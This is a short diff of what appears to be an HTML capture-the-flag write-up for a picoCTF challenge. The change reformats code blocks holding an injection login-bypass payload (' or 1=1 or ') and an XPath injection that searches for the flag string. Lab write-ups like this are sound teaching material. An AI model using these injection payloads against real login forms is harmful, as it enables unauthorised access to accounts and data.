@@ -36,7 +36,8 @@
                 on the right track.
             <pre>
                     <code>
---PAYLOAD:
+PAYLOAD:
+
 username: ' or 1=1 or '
 passowrd: (anything)
                     </code>
@@ -45,14 +46,16 @@ passowrd: (anything)
             web elements.
             <pre>
                 <code>
---GENERAL CONTAINS FORMAT:
+GENERAL CONTAINS FORMAT:
+
 //tagname[contains (@Attribute, ‘Value’)]
                 </code>
             </pre>
             Knowing this, we can query for the string of "picoCTF{" in the database.
             <pre>
                 <code>
---PAYLOAD:
+PAYLOAD:
+
 ' or //*[contains(.,"picoCTF{")] or '
                 </code>
             </pre>
